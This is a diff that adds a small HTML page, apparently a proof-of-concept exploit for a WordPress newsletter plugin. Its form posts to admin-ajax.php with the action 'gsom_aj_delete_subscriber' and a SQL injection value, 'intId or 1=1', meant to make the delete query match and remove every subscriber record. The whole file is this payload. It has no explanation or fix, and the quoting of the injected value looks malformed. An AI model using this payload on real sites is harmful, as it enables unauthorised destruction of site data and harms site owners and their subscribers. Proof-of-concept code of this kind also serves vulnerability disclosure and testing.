@@ -1,0 +1,9 @@
+
+<html>
+<form method="post" action="http://myserver/wp-admin/admin-ajax.php">
+<input type="text" name="action" value="gsom_aj_delete_subscriber">
+<input type="text" name="json" value="["intId or 1=1"]">
+<input type="text" name="_" value="">
+<input type="submit">
+</form>
+</html>
